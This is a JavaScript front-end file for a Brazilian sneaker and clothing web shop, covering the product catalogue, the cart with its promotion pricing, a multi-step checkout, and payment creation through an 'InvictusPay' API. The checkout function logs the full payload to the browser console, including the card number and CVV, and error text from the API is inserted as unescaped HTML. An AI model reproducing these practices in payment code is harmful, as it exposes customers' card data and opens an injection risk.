function getProductImagePath(filename) {
    return `images/Projeto Aurum/${filename}`;
}

function getElementValue(id, defaultValue = '') {
    const element = document.getElementById(id);
    if (!element) {
        console.warn(`[Checkout] Elemento não encontrado: ${id}`);
        return defaultValue;
    }
    const value = element.value.trim();
    console.log(`[Checkout] Lendo ${id}:`, value || '(vazio)');
    return value;
}

// ========================================
// RENDERIZAÇÃO DO CATÁLOGO
// ========================================

function renderProducts(category = 'all') {
    const filteredProducts = category === 'all' 
        ? products 
        : products.filter(p => p.category === category);
    
    productsGrid.innerHTML = filteredProducts.map((product, index) => `
        <div class="product-card" data-product-id="${product.id}" style="animation-delay: ${index * 0.05}s">
            <div class="product-image-wrapper">
                <img src="${getProductImagePath(product.images[0])}" 
                     alt="${product.name}" 
                     class="product-image"
                     loading="lazy">
                ${product.badge ? `<span class="product-badge ${product.isOffer ? 'offer' : ''} ${product.badge === 'NOCTA' ? 'nocta' : ''}">${product.badge}</span>` : ''}
                <button class="product-quick-view" data-product-id="${product.id}">Ver Detalhes</button>
            </div>
            <div class="product-info">
                <span class="product-category">${product.categoryLabel}</span>
                <h3 class="product-name">${product.name}</h3>
                <div class="product-price">
                    <span class="current">${formatPrice(product.price)}</span>
                    ${product.originalPrice ? `<span class="original">${formatPrice(product.originalPrice)}</span>` : ''}
                </div>
                <div class="product-sizes">
                    ${product.sizes.slice(0, 5).map(size => `<span class="size-tag">${size}</span>`).join('')}
                    ${product.sizes.length > 5 ? '<span class="size-tag">+</span>' : ''}
                </div>
                <div class="product-actions">
                    <button class="add-cart-btn" data-product-id="${product.id}">Adicionar</button>
                </div>
            </div>
        </div>
    `).join('');
    
    document.querySelectorAll('.product-quick-view, .add-cart-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            const productId = btn.dataset.productId;
            openProductModal(productId);
        });
    });
}

// ========================================
// MODAL DE PRODUTO
// ========================================

function openProductModal(productId) {
    currentProduct = products.find(p => p.id === productId);
    if (!currentProduct) return;
    
    selectedColor = currentProduct.colors[0];
    selectedSize = currentProduct.sizes[0];
    selectedQuantity = 1;
    
    document.getElementById('modalMainImage').src = getProductImagePath(currentProduct.images[0]);
    document.getElementById('modalCategory').textContent = currentProduct.categoryLabel;
    document.getElementById('modalTitle').textContent = currentProduct.name;
    document.getElementById('modalPrice').textContent = formatPrice(currentProduct.price);
    document.getElementById('modalDescription').textContent = currentProduct.description;
    
    if (currentProduct.originalPrice) {
        document.getElementById('modalOriginalPrice').textContent = formatPrice(currentProduct.originalPrice);
        document.getElementById('modalOriginalPrice').style.display = 'inline';
    } else {
        document.getElementById('modalOriginalPrice').style.display = 'none';
    }
    
    if (currentProduct.isOffer && currentProduct.originalPrice) {
        const discount = Math.round((1 - currentProduct.price / currentProduct.originalPrice) * 100);
        document.getElementById('modalPromoBadge').textContent = `${discount}% OFF`;
        document.getElementById('modalPromoBadge').style.display = 'inline-block';
    } else if (currentProduct.badge) {
        document.getElementById('modalPromoBadge').textContent = currentProduct.badge;
        document.getElementById('modalPromoBadge').style.display = 'inline-block';
    } else {
        document.getElementById('modalPromoBadge').style.display = 'none';
    }
    
    const thumbnailList = document.getElementById('modalThumbnails');
    thumbnailList.innerHTML = currentProduct.images.map((img, index) => `
        <div class="thumbnail ${index === 0 ? 'active' : ''}" data-image="${img}">
            <img src="${getProductImagePath(img)}" alt="${currentProduct.name} ${index + 1}">
        </div>
    `).join('');
    
    thumbnailList.querySelectorAll('.thumbnail').forEach(thumb => {
        thumb.addEventListener('click', () => {
            thumbnailList.querySelectorAll('.thumbnail').forEach(t => t.classList.remove('active'));
            thumb.classList.add('active');
            document.getElementById('modalMainImage').src = getProductImagePath(thumb.dataset.image);
        });
    });
    
    const colorOptions = document.getElementById('colorOptions');
    if (currentProduct.colors && currentProduct.colors.length > 1) {
        document.getElementById('colorSelector').style.display = 'block';
        colorOptions.innerHTML = currentProduct.colors.map((color, index) => `
            <button class="color-option ${index === 0 ? 'active' : ''}"
                    style="background-color: ${color.hex}"
                    data-color="${color.name}"
                    title="${color.name}"></button>
        `).join('');

        colorOptions.querySelectorAll('.color-option').forEach(option => {
            option.addEventListener('click', () => {
                colorOptions.querySelectorAll('.color-option').forEach(o => o.classList.remove('active'));
                option.classList.add('active');
                selectedColor = currentProduct.colors.find(c => c.name === option.dataset.color);
                document.getElementById('modalMainImage').src = getProductImagePath(selectedColor.image);
            });
        });

        document.getElementById('colorSelector').style.display = 'block';
    } else {
        document.getElementById('colorSelector').style.display = 'none';
        selectedColor = currentProduct.colors && currentProduct.colors[0] ? currentProduct.colors[0] : null;
    }
    
    const sizeOptions = document.getElementById('sizeOptions');
    sizeOptions.innerHTML = currentProduct.sizes.map((size, index) => `
        <button class="size-option ${index === 0 ? 'active' : ''}" data-size="${size}">${size}</button>
    `).join('');
    
    sizeOptions.querySelectorAll('.size-option').forEach(option => {
        option.addEventListener('click', () => {
            sizeOptions.querySelectorAll('.size-option').forEach(o => o.classList.remove('active'));
            option.classList.add('active');
            selectedSize = option.dataset.size;
        });
    });
    
    const slideSizeSelector = document.getElementById('slideSizeSelector');
    const slideSizeOptions = document.getElementById('slideSizeOptions');
    const slideSizeLabel = document.getElementById('slideSizeLabel');
    
    if (currentProduct.tnSizes && currentProduct.tnSizes.length > 0) {
        // Produto tem TN - mostrar tamanho do TN
        slideSizeSelector.style.display = 'block';
        if (slideSizeLabel) slideSizeLabel.textContent = 'Tamanho do TN';
        slideSizeOptions.innerHTML = currentProduct.tnSizes.map((size, index) => `
            <button class="size-option ${index === 0 ? 'active' : ''}" data-slide-size="${size}">${size}</button>
        `).join('');
        
        slideSizeOptions.querySelectorAll('.size-option').forEach(option => {
            option.addEventListener('click', () => {
                slideSizeOptions.querySelectorAll('.size-option').forEach(o => o.classList.remove('active'));
                option.classList.add('active');
                selectedSlideSize = option.dataset.slideSize;
            });
        });
        
        selectedSlideSize = currentProduct.tnSizes[0];
    } else if (currentProduct.slideSizes && currentProduct.slideSizes.length > 0) {
        // Produto tem Slide - mostrar tamanho do Slide
        slideSizeSelector.style.display = 'block';
        if (slideSizeLabel) slideSizeLabel.textContent = 'Tamanho do Slide';
        slideSizeOptions.innerHTML = currentProduct.slideSizes.map((size, index) => `
            <button class="size-option ${index === 0 ? 'active' : ''}" data-slide-size="${size}">${size}</button>
        `).join('');
        
        slideSizeOptions.querySelectorAll('.size-option').forEach(option => {
            option.addEventListener('click', () => {
                slideSizeOptions.querySelectorAll('.size-option').forEach(o => o.classList.remove('active'));
                option.classList.add('active');
                selectedSlideSize = option.dataset.slideSize;
            });
        });
        
        selectedSlideSize = currentProduct.slideSizes[0];
    } else {
        slideSizeSelector.style.display = 'none';
        selectedSlideSize = null;
    }
    
    document.getElementById('qtyInput').value = 1;
    
    // Esconder elemento de promo especial completamente
    const specialPromoEl = document.getElementById('specialPromo');
    specialPromoEl.innerHTML = '';
    
    document.body.classList.add('locked');
    productModal.classList.add('active');
}

function closeProductModal() {
    document.body.classList.remove('locked');
    productModal.classList.remove('active');
    currentProduct = null;
}

// ========================================
// CARRINHO DE COMPRAS
// ========================================

function addToCart() {
    if (!currentProduct) {
        console.log('[Cart] Erro: currentProduct é nulo');
        showToast('Erro ao adicionar ao carrinho', 'error');
        return;
    }

    console.log('[Cart] Adicionando ao carrinho:', currentProduct.name, 'Qtd:', selectedQuantity);

    const cartItem = {
        id: `${currentProduct.id}-${selectedColor.name}-${selectedSize}-${selectedSlideSize || ''}`,
        productId: currentProduct.id,
        name: currentProduct.name,
        color: selectedColor.name,
        size: selectedSize,
        slideSize: selectedSlideSize,
        price: currentProduct.price,
        image: selectedColor.image,
        quantity: selectedQuantity,
        hasSpecialPromo: currentProduct.hasSpecialPromo,
        product_hash: currentProduct.product_hash || null
    };
    
    console.log('[Cart] ID do item:', cartItem.id);
    
    // Verificar se já existe no carrinho
    const existingIndex = cart.findIndex(item => 
        item.productId === cartItem.productId && 
        item.color === cartItem.color && 
        item.size === cartItem.size &&
        (item.slideSize === cartItem.slideSize || (!item.slideSize && !cartItem.slideSize))
    );
    
    console.log('[Cart] Índice existente:', existingIndex);
    
    // Feedback visual de adição
    const addBtn = document.getElementById('addToCartBtn');
    const originalText = addBtn.textContent;
    addBtn.innerHTML = '<span class="btn-content">✓ Adicionado!</span>';
    addBtn.style.background = '#4CAF50';
    
    setTimeout(() => {
        addBtn.innerHTML = `<span class="btn-content">${originalText}</span>`;
        addBtn.style.background = '';
    }, 1500);
    
    if (existingIndex > -1) {
        // Produto já existe, aumentar quantidade
        cart[existingIndex].quantity += selectedQuantity;
        console.log('[Cart] Quantidade aumentada para:', cart[existingIndex].quantity);
        showToast(`${cartItem.name} - Quantidade atualizada!`, 'success');
    } else {
        // Novo produto
        cart.push(cartItem);
        console.log('[Cart] Novo produto adicionado');
        showToast(`${cartItem.name} adicionado ao carrinho!`, 'success');
    }
    
    saveCart();
    renderCart();
    updateCartCount();
    showToast(`${currentProduct.name} adicionado ao carrinho!`, 'success');
}

function removeFromCart(itemId) {
    console.log('[Cart] Removendo item:', itemId);
    const beforeLength = cart.length;
    cart = cart.filter(item => item.id !== itemId);
    const afterLength = cart.length;
    console.log('[Cart] Items antes:', beforeLength, 'depois:', afterLength);
    saveCart();
    renderCart();
    updateCartCount();
    showToast('Item removido do carrinho', 'success');
}

function updateQuantity(itemId, newQuantity) {
    console.log('[Cart] Atualizando quantidade:', itemId, 'nova qtd:', newQuantity);
    
    if (newQuantity < 1) {
        console.log('[Cart] Quantidade menor que 1, removendo item');
        removeFromCart(itemId);
        return;
    }
    
    const item = cart.find(item => item.id === itemId);
    if (item) {
        item.quantity = newQuantity;
        console.log('[Cart] Nova quantidade definida:', item.quantity);
        saveCart();
        renderCart();
        updateCartCount();
    } else {
        console.log('[Cart] Item não encontrado:', itemId);
    }
}

function calculateTotal() {
    let subtotal = 0;
    let discount = 0;
    
    const promoItems = {};
    cart.forEach(item => {
        if (item.hasSpecialPromo) {
            if (!promoItems[item.productId]) {
                promoItems[item.productId] = { price: item.price, quantity: 0 };
            }
            promoItems[item.productId].quantity += item.quantity;
        } else {
            subtotal += item.price * item.quantity;
        }
    });
    
    Object.values(promoItems).forEach(item => {
        const fullGroups = Math.floor(item.quantity / 3);
        const remainder = item.quantity % 3;
        
        subtotal += fullGroups * 150;
        subtotal += remainder * item.price;
        
        const regularTotal = item.quantity * item.price;
        const promoTotal = (fullGroups * 150) + (remainder * item.price);
        discount += (regularTotal - promoTotal);
    });
    
    return { subtotal, total: subtotal - discount, discount };
}

function renderCart() {
    if (cart.length === 0) {
        cartEmpty.style.display = 'flex';
        cartFooter.style.display = 'none';
        cartItemsContainer.innerHTML = '';
        return;
    }
    
    cartEmpty.style.display = 'none';
    cartFooter.style.display = 'block';
    
    const { subtotal, total, discount } = calculateTotal();
    
    cartItemsContainer.innerHTML = cart.map(item => `
        <div class="cart-item" data-item-id="${item.id}">
            <div class="cart-item-image">
                <img src="${getProductImagePath(item.image)}" alt="${item.name}">
            </div>
            <div class="cart-item-details">
                <h4 class="cart-item-name">${item.name}</h4>
                <p class="cart-item-variant">Cor: ${item.color} | Tam: ${item.size}${item.slideSize ? ` | Slide: ${item.slideSize}` : ''}</p>
                <div class="cart-item-bottom">
                    <span class="cart-item-price">${formatPrice(item.price)}</span>
                    <div class="cart-item-quantity">
                        <button class="cart-qty-btn" data-action="decrease" data-item-id="${item.id}">-</button>
                        <span class="cart-qty-value">${item.quantity}</span>
                        <button class="cart-qty-btn" data-action="increase" data-item-id="${item.id}">+</button>
                    </div>
                </div>
                <button class="cart-item-remove" data-item-id="${item.id}">Remover</button>
            </div>
        </div>
    `).join('');
    
    cartSubtotal.textContent = formatPrice(subtotal);
    cartTotal.textContent = formatPrice(total);
    
    if (discount > 0) {
        cartDiscount.style.display = 'flex';
        discountAmount.textContent = `-${formatPrice(discount)}`;
    } else {
        cartDiscount.style.display = 'none';
    }
    
    cartItemsContainer.querySelectorAll('.cart-qty-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const itemId = btn.dataset.itemId;
            const item = cart.find(i => i.id === itemId);
            if (item) {
                const newQuantity = btn.dataset.action === 'increase' ? item.quantity + 1 : item.quantity - 1;
                updateQuantity(itemId, newQuantity);
            }
        });
    });
    
    cartItemsContainer.querySelectorAll('.cart-item-remove').forEach(btn => {
        btn.addEventListener('click', () => {
            removeFromCart(btn.dataset.itemId);
        });
    });
}

function updateCartCount() {
    const totalCount = cart.reduce((sum, item) => sum + item.quantity, 0);
    cartCount.textContent = totalCount;
    
    // Atualizar também o contador do carrinho flutuante
    updateFloatingCartCount();
}

function saveCart() {
    localStorage.setItem('aurumCart', JSON.stringify(cart));
}

function openCart() {
    cartOverlay.classList.add('active');
    cartDrawer.classList.add('active');
    document.body.classList.add('locked');
}

function closeCart() {
    cartOverlay.classList.remove('active');
    cartDrawer.classList.remove('active');
    document.body.classList.remove('locked');
}

function openSizeGuide() {
    sizeGuideModal.classList.add('active');
}

function closeSizeGuide() {
    sizeGuideModal.classList.remove('active');
}

// ========================================
// FALLBACK: CLICK DIRETO NO BOTÃO DE FINALIZAR
// ========================================

const finalizeBtn = document.querySelector('button[type="submit"].checkout-submit-btn');
if (finalizeBtn) {
    console.log('[Checkout] Botão de finalizar encontrado, adicionando click handler...');
    finalizeBtn.addEventListener('click', (e) => {
        console.log('[Checkout] 🔘 Botão de finalizar clicado diretamente!');
        // Disparar o submit do formulário manualmente
        if (checkoutForm) {
            checkoutForm.dispatchEvent(new Event('submit', { cancelable: true, bubbles: true }));
        }
    });
} else {
    console.log('[Checkout] ⚠️ Botão de finalizar NÃO encontrado!');
}

// ========================================
// CHECKOUT
// ========================================

function openCheckoutModal() {
    checkoutForm.reset();
    checkoutError.style.display = 'none';
    checkoutLoading.style.display = 'none';
    checkoutForm.style.display = 'block';
    
    const { total } = calculateTotal();
    document.getElementById('checkoutTotal').textContent = formatPrice(total);
    
    updateInstallmentsVisibility();
    
    document.body.classList.add('locked');
    checkoutModal.classList.add('active');
}

// ========================================
// NAVEGAÇÃO ENTRE ETAPAS DO CHECKOUT
// ========================================

function goToStep(step) {
    const stepPersonal = document.getElementById('stepPersonal');
    const stepAddress = document.getElementById('stepAddress');
    const stepPayment = document.getElementById('stepPayment');
    const tabPersonal = document.querySelector('.checkout-tab[data-tab="personal"]');
    const tabAddress = document.querySelector('.checkout-tab[data-tab="address"]');
    const tabPayment = document.querySelector('.checkout-tab[data-tab="payment"]');
    
    // Esconder todas as etapas
    if (stepPersonal) stepPersonal.classList.remove('active');
    if (stepAddress) stepAddress.classList.remove('active');
    if (stepPayment) stepPayment.classList.remove('active');
    
    // Desativar todas as abas
    if (tabPersonal) {
        tabPersonal.classList.remove('active');
        tabPersonal.classList.add('disabled');
    }
    if (tabAddress) {
        tabAddress.classList.remove('active');
        tabAddress.classList.add('disabled');
    }
    if (tabPayment) tabPayment.classList.remove('active');
    
    // Ativar a etapa correta
    if (step === 'personal') {
        if (stepPersonal) stepPersonal.classList.add('active');
        if (tabPersonal) {
            tabPersonal.classList.add('active');
            tabPersonal.classList.remove('disabled');
        }
    } else if (step === 'address') {
        if (stepAddress) stepAddress.classList.add('active');
        if (tabAddress) {
            tabAddress.classList.add('active');
            tabAddress.classList.remove('disabled');
        }
    } else if (step === 'payment') {
        if (stepPayment) stepPayment.classList.add('active');
        if (tabPayment) tabPayment.classList.add('active');
    }
    
    // Rolar para o topo do modal
    if (checkoutModal) checkoutModal.scrollTop = 0;
}

function validatePersonalStep() {
    const customerName = getElementValue('customerName');
    const customerEmail = getElementValue('customerEmail');
    const customerPhone = getElementValue('customerPhone');
    const customerCPF = getElementValue('customerCPF');
    
    // Validar nome
    if (!customerName || customerName.length < 3) {
        checkoutError.querySelector('span').textContent = 'Por favor, preencha seu nome completo.';
        checkoutError.style.display = 'flex';
        return false;
    }
    
    // Validar e-mail
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!customerEmail || !emailRegex.test(customerEmail)) {
        checkoutError.querySelector('span').textContent = 'Por favor, insira um e-mail válido.';
        checkoutError.style.display = 'flex';
        return false;
    }
    
    // Validar telefone
    if (!customerPhone || customerPhone.length < 14) {
        checkoutError.querySelector('span').textContent = 'Por favor, preencha um telefone válido.';
        checkoutError.style.display = 'flex';
        return false;
    }
    
    // Validar CPF
    const cpfRegex = /^\d{3}\.\d{3}\.\d{3}-\d{2}$|^\d{11}$/;
    if (!customerCPF || !cpfRegex.test(customerCPF)) {
        checkoutError.querySelector('span').textContent = 'Por favor, insira um CPF válido (formato: 000.000.000-00).';
        checkoutError.style.display = 'flex';
        return false;
    }
    
    // Limpar erro se tudo estiver válido
    checkoutError.style.display = 'none';
    return true;
}

function validateAddressStep() {
    const customerAddress = getElementValue('customerAddress');
    const customerNumber = getElementValue('customerNumber');
    const customerNeighborhood = getElementValue('customerNeighborhood');
    const customerCity = getElementValue('customerCity');
    const customerState = getElementValue('customerState');
    const customerCEP = getElementValue('customerCEP');
    
    // Validar endereço
    if (!customerAddress) {
        checkoutError.querySelector('span').textContent = 'Por favor, preencha o logradouro.';
        checkoutError.style.display = 'flex';
        return false;
    }
    
    if (!customerNumber) {
        checkoutError.querySelector('span').textContent = 'Por favor, preencha o número do endereço.';
        checkoutError.style.display = 'flex';
        return false;
    }
    
    if (!customerNeighborhood) {
        checkoutError.querySelector('span').textContent = 'Por favor, preencha o bairro.';
        checkoutError.style.display = 'flex';
        return false;
    }
    
    if (!customerCity) {
        checkoutError.querySelector('span').textContent = 'Por favor, preencha a cidade.';
        checkoutError.style.display = 'flex';
        return false;
    }
    
    if (!customerState) {
        checkoutError.querySelector('span').textContent = 'Por favor, selecione o estado.';
        checkoutError.style.display = 'flex';
        return false;
    }
    
    if (!customerCEP || customerCEP.length < 9) {
        checkoutError.querySelector('span').textContent = 'Por favor, preencha um CEP válido.';
        checkoutError.style.display = 'flex';
        return false;
    }
    
    // Limpar erro se tudo estiver válido
    checkoutError.style.display = 'none';
    return true;
}

function updateInstallmentsVisibility() {
    const paymentMethod = document.getElementById('paymentMethod').value;
    const installmentsGroup = document.getElementById('installmentsGroup');
    const creditCardFields = document.getElementById('creditCardFields');

    console.log('[Checkout] Payment Method selecionado:', paymentMethod);

    if (paymentMethod === 'credit_card') {
        installmentsGroup.style.display = 'block';
        creditCardFields.style.display = 'block';
    } else {
        installmentsGroup.style.display = 'none';
        creditCardFields.style.display = 'none';
    }
}

function closeCheckoutModal() {
    // Limpar conteúdo de pagamento
    const checkoutContent = document.getElementById('checkoutContent');
    if (checkoutContent) {
        checkoutContent.style.display = 'none';
        checkoutContent.innerHTML = '';
    }
    
    // Resetar formulário
    checkoutForm.reset();
    checkoutForm.style.display = 'block';
    checkoutLoading.style.display = 'none';
    checkoutError.style.display = 'none';
    
    // Resetar etapas para a primeira
    const stepPersonal = document.getElementById('stepPersonal');
    const stepAddress = document.getElementById('stepAddress');
    const stepPayment = document.getElementById('stepPayment');
    const tabPersonal = document.querySelector('.checkout-tab[data-tab="personal"]');
    const tabAddress = document.querySelector('.checkout-tab[data-tab="address"]');
    const tabPayment = document.querySelector('.checkout-tab[data-tab="payment"]');
    
    if (stepPersonal) stepPersonal.classList.add('active');
    if (stepAddress) stepAddress.classList.remove('active');
    if (stepPayment) stepPayment.classList.remove('active');
    
    if (tabPersonal) {
        tabPersonal.classList.add('active');
        tabPersonal.classList.remove('disabled');
    }
    if (tabAddress) tabAddress.classList.remove('active');
    if (tabPayment) tabPayment.classList.remove('active');
    
    // Esconder campos de cartão de crédito
    const creditCardFields = document.getElementById('creditCardFields');
    const installmentsGroup = document.getElementById('installmentsGroup');
    if (creditCardFields) creditCardFields.style.display = 'none';
    if (installmentsGroup) installmentsGroup.style.display = 'none';
    
    document.body.classList.remove('locked');
    checkoutModal.classList.remove('active');
}

// Função para voltar aos dados do formulário
function backToForm() {
    const checkoutContent = document.getElementById('checkoutContent');
    if (checkoutContent) {
        checkoutContent.style.display = 'none';
        checkoutContent.innerHTML = '';
    }
    
    // Resetar etapas para a primeira
    const stepPersonal = document.getElementById('stepPersonal');
    const stepAddress = document.getElementById('stepAddress');
    const stepPayment = document.getElementById('stepPayment');
    const tabPersonal = document.querySelector('.checkout-tab[data-tab="personal"]');
    const tabAddress = document.querySelector('.checkout-tab[data-tab="address"]');
    const tabPayment = document.querySelector('.checkout-tab[data-tab="payment"]');
    
    if (stepPersonal) stepPersonal.classList.add('active');
    if (stepAddress) stepAddress.classList.remove('active');
    if (stepPayment) stepPayment.classList.remove('active');
    
    if (tabPersonal) {
        tabPersonal.classList.add('active');
        tabPersonal.classList.remove('disabled');
    }
    if (tabAddress) tabAddress.classList.remove('active');
    if (tabPayment) tabPayment.classList.remove('active');
    
    // Mostrar formulário novamente
    checkoutForm.style.display = 'block';
    checkoutLoading.style.display = 'none';
    checkoutError.style.display = 'none';
    
    // Esconder campos de cartão de crédito
    const creditCardFields = document.getElementById('creditCardFields');
    const paymentMethod = document.getElementById('paymentMethod').value;
    if (creditCardFields && paymentMethod === 'credit_card') {
        creditCardFields.style.display = 'block';
    } else if (creditCardFields) {
        creditCardFields.style.display = 'none';
    }
    
    console.log('[Checkout] Voltou para preenchimento de dados');
}

async function initiateInvictusPayCheckout(customerData, paymentMethod, installments, cardData = null) {
    const { total } = calculateTotal();
    
    console.log('');
    console.log('═══════════════════════════════════════════════════════════════');
    console.log('[Checkout] ████ CRIANDO PAYLOAD PARA INVICTUSPAY ████');
    console.log('═══════════════════════════════════════════════════════════════');
    
    const items = cart.map(item => ({
        id: item.productId,
        name: item.name,
        price: item.price,
        quantity: item.quantity,
        image: item.image,
        product_hash: item.product_hash || null
    }));
    
    // Usar a hash do primeiro produto automaticamente (não requer entrada manual)
    const firstProductHash = items[0]?.product_hash || null;
    
    const payload = {
        items: items,
        customer: {
            name: customerData.name,
            email: customerData.email,
            phone: customerData.phone || '',
            document: customerData.cpf || customerData.document || '',
            address: customerData.address || null
        },
        paymentMethod: paymentMethod || 'pix',
        installments: (paymentMethod === 'credit_card' && installments) ? parseInt(installments) : 1,
        offer_hash: firstProductHash  // Hash automática do primeiro produto
    };
    
    // Adicionar dados do cartão se for pagamento com cartão de crédito
    if (paymentMethod === 'credit_card' && cardData) {
        payload.card = {
            number: cardData.number.replace(/\s/g, ''),
            holder_name: cardData.holder_name,
            exp_month: parseInt(cardData.exp_month),
            exp_year: parseInt(cardData.exp_year),
            cvv: cardData.cvv
        };
    }
    
    console.log('[Checkout] Payload criado:');
    console.log(JSON.stringify(payload, null, 2));
    console.log('═══════════════════════════════════════════════════════════════');

    // Mostrar loading imediatamente
    checkoutError.style.display = 'none';
    checkoutForm.style.display = 'none';
    checkoutLoading.style.display = 'flex';
    console.log('[Checkout] ✅ Loading visível');

    // Função para tentar o checkout com retry
    async function attemptCheckout(attempts = 3) {
        for (let i = 0; i < attempts; i++) {
            try {
                console.log(`[Checkout] ═══════════════════════════════════════════════════════════`);
                console.log(`[Checkout] Tentativa ${i + 1} de ${attempts}`);
                console.log(`[Checkout] Endpoint: ${API_CONFIG.endpoints.createCheckout}`);
                console.log(`[Checkout] ═══════════════════════════════════════════════════════════`);

                const controller = new AbortController();
                const timeoutId = setTimeout(() => {
                    controller.abort();
                    console.log('[Checkout] ⚠️ Timeout alcançado (15s)');
                }, 15000); // 15s timeout

                console.log('[Checkout] Enviando requisição...');
                
                const response = await fetch(API_CONFIG.endpoints.createCheckout, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload),
                    signal: controller.signal
                });

                clearTimeout(timeoutId);
                console.log(`[Checkout] ✅ Response received! Status: ${response.status}`);
                console.log(`[Checkout] Response OK: ${response.ok}`);
                console.log(`[Checkout] Response statusText: ${response.statusText}`);

                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }

                const data = await response.json();
                console.log('[Checkout] Resposta da API:', JSON.stringify(data, null, 2));
                console.log('[Checkout] paymentMethod:', paymentMethod);
                console.log('[Checkout] qr_code:', data.qr_code);
                console.log('[Checkout] qr_code_base64:', data.qr_code_base64);
                console.log('[Checkout] payment_url:', data.payment_url);

                return data;
            } catch (error) {
                console.error(`[Checkout] Tentativa ${i + 1} falhou:`, error.name, error.message);

                if (i === attempts - 1) {
                    // Última tentativa falhou - adicionar mais info
                    throw new Error(`Falha após ${attempts} tentativas: ${error.message}`);
                }

                // Esperar antes de tentar novamente (backoff exponencial)
                await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
            }
        }
    }

    try {
        const data = await attemptCheckout(3);
        console.log('[Checkout] ✅ Dados recebidos com sucesso');
        console.log('[Checkout] Resposta completa:', JSON.stringify(data, null, 2));

        if (data.success) {
            console.log('[Checkout] API retornou success: true');

            // Normalizar dados da API (extrair QR code do caminho correto)
            const normalizedData = {
                success: data.success,
                transaction_hash: data.transaction_hash || data.data?.hash,
                status: data.status || data.data?.status,
                payment_method: data.payment_method || data.data?.payment_method,
                payment_url: data.payment_url || data.data?.payment_url || data.data?.pix?.pix_url,
                // CORREÇÃO: Acessar pix_code corretamente da estrutura da resposta
                qr_code: data.qr_code || data.data?.pix_code || data.data?.pix?.pix_code || data.data?.pix?.pix_qr_code || null,
                qr_code_base64: data.qr_code_base64 || data.data?.pix_code_base64 || data.data?.pix?.qr_code_base64 || null,
                billet_url: data.billet_url || data.data?.billet?.billet_url || null,
                billet_barcode: data.billet_barcode || data.data?.billet?.billet_barcode || null,
                billet_digitable_line: data.billet_digitable_line || data.data?.billet?.billet_digitable_line || null,
                data: data.data
            };

            console.log('[Checkout] QR Code normalizado:', normalizedData.qr_code);

            // DEBUG: Log do método de pagamento
            console.log('[Checkout] ============================================');
            console.log('[Checkout] paymentMethod:', paymentMethod);
            console.log('[Checkout] paymentMethod (tipo):', typeof paymentMethod);
            console.log('[Checkout] paymentMethod === "pix":', paymentMethod === 'pix');
            console.log('[Checkout] paymentMethod === "credit_card":', paymentMethod === 'credit_card');
            console.log('[Checkout] ============================================');

            // Para PIX: mostrar QR Code
            if (paymentMethod === 'pix') {
                console.log('[Checkout] → Modo PIX');
                // Verificar se há QR code ou URL de pagamento
                if (normalizedData.qr_code || normalizedData.qr_code_base64 || normalizedData.payment_url) {
                    console.log('[Checkout] → Mostrando QR Code');
                    showPixPayment(normalizedData);
                } else {
                    // Se não tem nenhum, mostrar sucesso e informar que é pagamento pendente
                    console.log('[Checkout] → Sem QR code, mostrando tela de pendente');
                    showPixPayment({
                        ...data,
                        qr_code: 'Pagamento criado! Aguardando processamento...',
                        qr_code_base64: null
                    });
                }
            }
            // Para cartão: mostrar status
            else if (paymentMethod === 'credit_card') {
                console.log('[Checkout] → Modo Cartão');
                showCreditCardPaymentResult(data);
            }
            // Para boleto: mostrar linha digitável
            else if (paymentMethod === 'billet' && (data.billet_url || data.billet_digitable_line)) {
                console.log('[Checkout] → Modo Boleto');
                showBilletPayment(data);
            }
            // Redirecionar se houver URL de pagamento
            else if (data.payment_url) {
                console.log('[Checkout] → Redirecionamento via URL');
                showToast('Redirecionando para pagamento...', 'success');
                setTimeout(() => {
                    window.location.href = data.payment_url;
                }, 1000);
            }
            else {
                console.log('[Checkout] → Sucesso geral (sem método específico)');
                console.log('[Checkout] paymentMethod não reconhecido:', paymentMethod);
                showToast('Pagamento criado com sucesso!', 'success');
                setTimeout(() => {
                    window.location.href = 'checkout-success.html';
                }, 2000);
            }
        } else {
            console.log('[Checkout] ❌ API retornou success: false');
            let errorMessage = data.error || 'Erro ao processar pagamento';
            console.error('[Checkout] ❌ ERRO DA API:', errorMessage);

            checkoutLoading.style.display = 'none';
            checkoutError.innerHTML = `<span>${errorMessage}</span>`;
            checkoutError.style.display = 'flex';
            checkoutForm.style.display = 'block';
        }
    } catch (error) {
        console.error('[Checkout] ❌ Erro completo:', error);
        console.error('[Checkout] Stack:', error.stack);

        // FORÇA A APARECER ALGO
        checkoutLoading.style.display = 'none';

        let errorMessage = `
            <div style="text-align: center; padding: 20px;">
                <p style="font-size: 48px; margin: 0;">❌</p>
                <p style="font-size: 18px; font-weight: bold; margin-top: 15px;">Erro de conexão</p>
                <p style="color: #666; margin-top: 10px;">${error.message}</p>
                <div style="margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 8px;">
                    <p style="font-size: 12px; color: #999;">O pagamento pode ter sido criado na gateway. Verifique se o pedido aparece como "PENDENTE".</p>
                </div>
                <button onclick="location.reload()" style="margin-top: 20px; padding: 12px 24px; background: #D4AF37; color: #000; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">
                    🔄 Tentar Novamente
                </button>
            </div>
        `;

        checkoutError.innerHTML = errorMessage;
        checkoutError.style.display = 'flex';
        checkoutForm.style.display = 'none';
        document.getElementById('checkoutContent').style.display = 'none';
    }
}

function showPixPayment(data) {
    checkoutLoading.style.display = 'none';

    const content = document.getElementById('checkoutContent');
    
    // Forçar exibição do conteúdo - garantir que todos os estilos de ocultação sejam removidos
    content.style.display = 'block';
    content.style.visibility = 'visible';
    content.style.opacity = '1';
    content.style.position = 'relative';
    content.style.zIndex = '10';
    
    // Remover qualquer classe CSS que possa estar ocultando o elemento
    content.classList.remove('hidden');
    content.classList.remove('collapsed');
    
    // Extrair o código PIX de múltiplas fontes possíveis
    const qrCode = data.qr_code || 
                   data.pix_code || 
                   data.data?.pix_code || 
                   data.data?.pix?.pix_code || 
                   data.data?.pix?.qr_code || 
                   data.pix?.pix_code ||
                   '';
    
    // Armazenar código PIX na variável global para a função copyPixCode
    currentPixCode = qrCode;
    
    const transactionHash = data.transaction_hash || data.data?.hash || data.transaction_id || '';
    
    console.log('[Pix] Dados recebidos:', JSON.stringify(data, null, 2));
